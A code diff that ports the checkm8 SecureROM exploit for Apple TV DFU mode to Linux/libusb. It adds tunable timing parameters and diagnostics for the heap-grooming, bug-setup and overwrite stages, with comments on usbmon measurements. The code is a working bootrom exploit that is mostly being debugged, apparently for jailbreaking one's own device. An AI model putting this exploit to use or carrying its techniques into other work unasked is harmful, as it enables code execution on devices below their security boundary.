@@ -174,6 +174,131 @@ static int isTransferTimeout(int ret) {
     return ret == IRECV_E_TIMEOUT || ret == LIBUSB_RET_TIMEOUT;
 }
 
+// How long the bug-setup DFU_DNLOAD is left running before it gets aborted.
+// The default is the original DeviceManager.m's own value
+// (irecv_async_usb_control_transfer_with_cancel(..., u_time=100)), which is
+// what works on macOS/IOKit.
+//
+// Tunable because it does not survive the move to libusb: a usbmon capture of
+// a real Linux run shows that abort landing after ~318us of URB lifetime with
+// the device having consumed 0 of 2048 bytes -- the host controller never
+// started the data stage. The whole point of this transfer is to leave the
+// device's DFU handler holding a partially-filled buffer, so 0 bytes means
+// the exploit's precondition never exists and everything after it is writing
+// into an ungroomed heap. Ordinary control transfers on that same bus
+// complete in 27-820us, so 100us is simply below the floor for getting a data
+// stage moving there.
+//
+// Named to match gaster's own DEBUG_CANCEL_DELAY_US, so one sweep covers
+// both tools. See scripts/sweep_pwn_cancel_delay.py.
+#define kDefaultCancelDelayUs 100u
+
+static unsigned cancelDelayUs(void) {
+    static int resolved = 0;
+    static unsigned value = kDefaultCancelDelayUs;
+
+    if (!resolved) {
+        const char* env = getenv("DEBUG_CANCEL_DELAY_US");
+        unsigned parsed;
+        if (env != NULL && sscanf(env, "%u", &parsed) == 1) {
+            value = parsed;
+        }
+        resolved = 1;
+    }
+    return value;
+}
+
+// How long the overwrite transfer is given to deliver its 1660 bytes. 100ms
+// is the original macOS value.
+//
+// Tunable because a usbmon capture shows the device absorbing this transfer
+// at roughly 5.7 bytes/ms -- around 55x slower than the ~310 bytes/ms the
+// setup transfer achieves on the same bus, because the device NAKs almost
+// continuously while taking it. At that rate 1660 bytes needs about 290ms,
+// so a 100ms ceiling cuts the transfer off around a third of the way in and
+// the overwrite struct (which sits at the very end, at overwrite_offset)
+// never lands.
+#define kDefaultOverwriteTimeoutMs 100u
+
+static unsigned overwriteTimeoutMs(void) {
+    static int resolved = 0;
+    static unsigned value = kDefaultOverwriteTimeoutMs;
+
+    if (!resolved) {
+        const char* env = getenv("DEBUG_OVERWRITE_TIMEOUT_MS");
+        unsigned parsed;
+        if (env != NULL && sscanf(env, "%u", &parsed) == 1) {
+            value = parsed;
+        }
+        resolved = 1;
+    }
+    return value;
+}
+
+// Whether to hold one connection from the bug setup through the overwrite,
+// instead of closing, sleeping 500ms and reopening in between.
+//
+// The close/reopen is what the macOS original does and it works there. On
+// Linux a usbmon capture shows the device treating the same request very
+// differently either side of it: gaster, which issues its equivalent
+// immediately after the aborted download on the same connection, gets the
+// device to accept up to the full 1632 bytes; blackb0x-pwn, which issues it
+// after CLRSTATUS plus a close, half a second of nothing, a reopen, a stall
+// and a leak, gets it stalled with zero bytes delivered at every bug-setup
+// size tried. Half a second with the handle closed is a long time for a DFU
+// state machine to keep a dangling buffer, and it is the one step gaster
+// does not perform.
+//
+// Off by default: the close/reopen is the behaviour the working macOS path
+// uses, so this only changes anything when deliberately switched on.
+static int keepConnectionThroughOverwrite(void) {
+    static int resolved = 0;
+    static int value = 0;
+
+    if (!resolved) {
+        value = getenv("DEBUG_KEEP_CONNECTION") != NULL;
+        resolved = 1;
+    }
+    return value;
+}
+
+// Whether a heap-grooming request returning something unexpected stops the
+// run.
+//
+// Every groom request here is expected to fail in one specific way -- a stall
+// for usb_req_stall(), a transfer timeout for the leaks -- and anything else
+// aborts. That is how the original was written, and it stays the default. But
+// the groom is only shaping the heap, not producing a result anything reads,
+// so a single odd return does not necessarily mean the state is unusable; it
+// just means the device answered differently than macOS taught this code to
+// expect. With DEBUG_KEEP_CONNECTION set, one of the 627 leaks comes back
+// EPROTO instead of timing out and the run stops there, before the overwrite
+// -- which is the transfer actually worth observing.
+//
+// Off by default, so an unset environment is still the strict, macOS
+// behaviour.
+static int ignoreGroomErrors(void) {
+    static int resolved = 0;
+    static int value = 0;
+
+    if (!resolved) {
+        value = getenv("DEBUG_IGNORE_GROOM_ERRORS") != NULL;
+        resolved = 1;
+    }
+    return value;
+}
+
+// Nonzero if the caller should bail. Reports and continues instead when
+// DEBUG_IGNORE_GROOM_ERRORS is set.
+static int groomFailure(const char* message, int ret) {
+    if (ignoreGroomErrors()) {
+        printf("warning: %s (ret %d) -- continuing, DEBUG_IGNORE_GROOM_ERRORS is set\n", message, ret);
+        return 0;
+    }
+    printf("%s (ret %d)\n", message, ret);
+    return 1;
+}
+
 static int get_payload_configuration(uint16_t cpid, const char* identifier, checkm8_config_t* config) {
     (void)identifier;
 
@@ -212,17 +337,39 @@ static int get_exploit_configuration(uint16_t cpid, checkm8_config_t* config) {
 
 // ecid == 0 opens the first DFU-mode device irecv_open_with_ecid() finds --
 // matches how the rest of this tool (and gaster itself) work: one device
-// connected at a time, no menu. Patient (30 one-second retries, not
-// get_tv's usual handful): checkm8() in particular needs to reconnect to a
-// device that's actively re-initializing its own USB stack after a bus
-// reset or after running injected SecureROM-level code, which can take
-// meaningfully longer than a short default -- see DeviceManager.cpp's own
-// get_tv_patient() comment for the same reasoning applied to the gaster
-// path.
+// connected at a time, no menu.
+//
+// Thirty one-second retries by default: a device re-initialising its USB
+// stack after a bus reset, or after running injected SecureROM-level code,
+// can take meaningfully longer to come back than a short default allows.
+//
+// DEBUG_RECONNECT_ATTEMPTS shortens that for sweeping, where a stage that is
+// never coming back costs thirty seconds every time and an Apple TV can be
+// put back into DFU far faster than that (scripts/sweep_pwn_cancel_delay.py
+// sets it to 5). Left at the original value unless asked, so the macOS path
+// this was ported from keeps exactly the patience it was written with.
+#define kDefaultReconnectAttempts 30
+
+static int reconnectAttempts(void) {
+    static int resolved = 0;
+    static int value = kDefaultReconnectAttempts;
+
+    if (!resolved) {
+        const char* env = getenv("DEBUG_RECONNECT_ATTEMPTS");
+        int parsed;
+        if (env != NULL && sscanf(env, "%d", &parsed) == 1 && parsed > 0) {
+            value = parsed;
+        }
+        resolved = 1;
+    }
+    return value;
+}
+
 static irecv_client_t get_tv(uint64_t ecid) {
     irecv_client_t client = NULL;
+    const int attempts = reconnectAttempts();
 
-    for (int i = 0; i < 30; i++) {
+    for (int i = 0; i < attempts; i++) {
         irecv_error_t err = irecv_open_with_ecid(&client, ecid);
         if (err == IRECV_E_SUCCESS) {
             return client;
@@ -232,7 +379,8 @@ static irecv_client_t get_tv(uint64_t ecid) {
             return NULL;
         }
         if (i > 0) {
-            fprintf(stderr, "  (reconnect attempt %d/30: %s, retrying...)\n", i + 1, irecv_strerror(err));
+            fprintf(stderr, "  (reconnect attempt %d/%d: %s, retrying...)\n", i + 1, attempts,
+                    irecv_strerror(err));
         }
         sleep(1);
     }
@@ -389,8 +537,7 @@ int runCheckm8(uint64_t ecid) {
     puts("Exploiting with checkm8");
 
     ret = usb_req_stall(client);
-    if (!isPipeStall(ret)) {
-        printf("Failed to stall pipe %i.\n", ret);
+    if (!isPipeStall(ret) && groomFailure("Failed to stall pipe", ret)) {
         free(config.payload);
         irecv_close(client);
         return 0;
@@ -398,19 +545,33 @@ int runCheckm8(uint64_t ecid) {
 
     usleep(100);
 
+    int leakFailures = 0;
+    int lastLeakFailure = 0;
     for (int i = 0; i < config.large_leak; i++) {
         ret = usb_req_leak(client);
         if (!isTransferTimeout(ret)) {
-            printf("Failed to create heap hole.\n");
-            free(config.payload);
-            irecv_close(client);
-            return 0;
+            // Counted rather than reported per iteration: with
+            // DEBUG_IGNORE_GROOM_ERRORS set this can fire hundreds of
+            // times and the total is the useful number.
+            ++leakFailures;
+            lastLeakFailure = ret;
+            if (!ignoreGroomErrors()) {
+                printf("Failed to create heap hole (leak %d of %d, ret %d)\n",
+                       i + 1, (int)config.large_leak, ret);
+                free(config.payload);
+                irecv_close(client);
+                return 0;
+            }
         }
+    }
+    if (leakFailures > 0) {
+        printf("warning: %d of %d groom leaks did not time out (last ret %d) -- continuing, "
+               "DEBUG_IGNORE_GROOM_ERRORS is set\n",
+               leakFailures, (int)config.large_leak, lastLeakFailure);
     }
 
     ret = usb_req_no_leak(client);
-    if (!isTransferTimeout(ret)) {
-        printf("Failed to create heap hole.\n");
+    if (!isTransferTimeout(ret) && groomFailure("Failed to create heap hole (no-leak)", ret)) {
         free(config.payload);
         irecv_close(client);
         return 0;
@@ -430,7 +591,17 @@ int runCheckm8(uint64_t ecid) {
 
     puts("Preparing for overwrite");
 
-    int sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, 100);
+    unsigned delayUs = cancelDelayUs();
+    int sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, delayUs);
+    // The one number that decides whether this stage did anything, and it was
+    // previously computed and thrown away. Anything outside 0 < sent <=
+    // overwrite_offset means the following overwrite lands somewhere the
+    // exploit did not intend. Reported, not enforced: sent == 0 is known to
+    // be useless in principle, but the macOS path this was ported from is
+    // confirmed working and has never been measured, so refusing to continue
+    // on 0 could break the one configuration known to succeed.
+    printf("bug setup: cancel delay %u us -> device consumed %d of %d bytes (want 0 < n <= %d)\n",
+           delayUs, sent, 0x800, config.overwrite_offset);
     if (sent < 0) {
         printf("Failed to send bug setup.\n");
         free(config.payload);
@@ -452,22 +623,26 @@ int runCheckm8(uint64_t ecid) {
         return 0;
     }
 
-    irecv_close(client);
-    client = NULL;
-    usleep(500000);
+    if (keepConnectionThroughOverwrite()) {
+        puts("keeping the connection open through the overwrite (skipping the "
+             "close/500ms/reopen)");
+    } else {
+        irecv_close(client);
+        client = NULL;
+        usleep(500000);
 
-    client = get_tv(ecid);
-    if (!client) {
-        fprintf(stderr, "checkm8: device did not reappear before heap grooming.\n");
-        free(config.payload);
-        return 0;
+        client = get_tv(ecid);
+        if (!client) {
+            fprintf(stderr, "checkm8: device did not reappear before heap grooming.\n");
+            free(config.payload);
+            return 0;
+        }
     }
 
     puts("Grooming heap");
 
     ret = usb_req_stall(client);
-    if (!isPipeStall(ret)) {
-        printf("Failed to stall pipe.\n");
+    if (!isPipeStall(ret) && groomFailure("Failed to stall pipe", ret)) {
         free(config.payload);
         irecv_close(client);
         return 0;
@@ -476,8 +651,7 @@ int runCheckm8(uint64_t ecid) {
     usleep(100);
 
     ret = usb_req_leak(client);
-    if (!isTransferTimeout(ret)) {
-        printf("Failed to create heap hole.\n");
+    if (!isTransferTimeout(ret) && groomFailure("Failed to create heap hole", ret)) {
         free(config.payload);
         irecv_close(client);
         return 0;
@@ -495,7 +669,19 @@ int runCheckm8(uint64_t ecid) {
     }
     memcpy(overwrite_buf + config.overwrite_offset, config.overwrite, config.overwrite_len);
 
-    irecv_usb_control_transfer(client, 0, 0, 0, 0, overwrite_buf, (uint16_t)overwrite_buf_len, 100);
+    unsigned overwriteTimeout = overwriteTimeoutMs();
+    int overwriteRet = irecv_usb_control_transfer(client, 0, 0, 0, 0, overwrite_buf,
+                                                   (uint16_t)overwrite_buf_len, overwriteTimeout);
+    // A negative return here is the transfer's error code, not a byte count --
+    // libusb reports a timeout as LIBUSB_ERROR_TIMEOUT regardless of how much
+    // actually went out, so how far this got is only visible on the wire (see
+    // scripts/analyze_usbmon_checkm8.py). Reported anyway to distinguish the
+    // two states a usbmon capture showed this transfer taking: stalled
+    // outright having moved nothing, versus accepted and absorbing data.
+    printf("overwrite: %zu bytes offered with a %u ms timeout -> ret %d%s\n",
+           overwrite_buf_len, overwriteTimeout, overwriteRet,
+           isPipeStall(overwriteRet) ? " (stalled -- device rejected it outright)"
+                                     : (isTransferTimeout(overwriteRet) ? " (timed out mid-transfer)" : ""));
     free(overwrite_buf);
 
     puts("Uploading payload");
